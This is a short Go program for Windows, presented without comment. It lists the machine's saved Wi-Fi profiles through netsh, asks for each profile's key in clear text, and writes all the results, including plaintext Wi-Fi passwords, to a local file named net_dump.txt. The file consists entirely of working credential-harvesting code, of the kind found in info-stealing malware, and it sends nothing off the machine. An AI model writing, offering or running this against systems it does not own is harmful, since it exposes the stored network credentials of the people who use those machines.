package main

import (
	"os"
	"os/exec"
	"strings"
)

func main() {
	cmd := exec.Command("netsh", "wlan", "show", "profiles")
	output, err := cmd.Output()
	if err != nil {
		return
	}
	profiles := string(output)
	lines := strings.Split(profiles, "\n")
	for i, j := 0, len(lines)-1; i < j; i, j = i+1, j-1 {
        lines[i], lines[j] = lines[j], lines[i]
    }
	var wifiProfiles []string
	for _, v := range lines {
		if strings.Contains(v, ":") {
			profile := strings.TrimSpace(strings.Split(v, ":")[1])
			wifiProfiles = append(wifiProfiles, profile)
		}
	}
	f, _ := os.Create("net_dump.txt")
	for _, profile := range wifiProfiles {
		cmd := exec.Command("netsh", "wlan", "show", "profile", profile, "key=clear")
		output, err := cmd.Output()
		if err != nil {
			continue
		}
		f.WriteString(string(output)+"\n\n\n")
	}
	f.Close()
}
